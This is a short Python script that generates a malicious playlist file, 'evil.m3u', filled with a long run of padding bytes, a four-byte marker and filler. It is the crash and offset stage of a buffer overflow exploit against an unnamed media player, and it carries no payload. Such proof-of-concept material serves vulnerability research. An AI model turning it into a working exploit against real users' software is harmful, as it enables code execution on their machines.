#!/usr/bin/python

filename="evil.m3u"
buffer = "\x41"* 26081 + "\x42" * 4 + "\x43" * 1000
textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()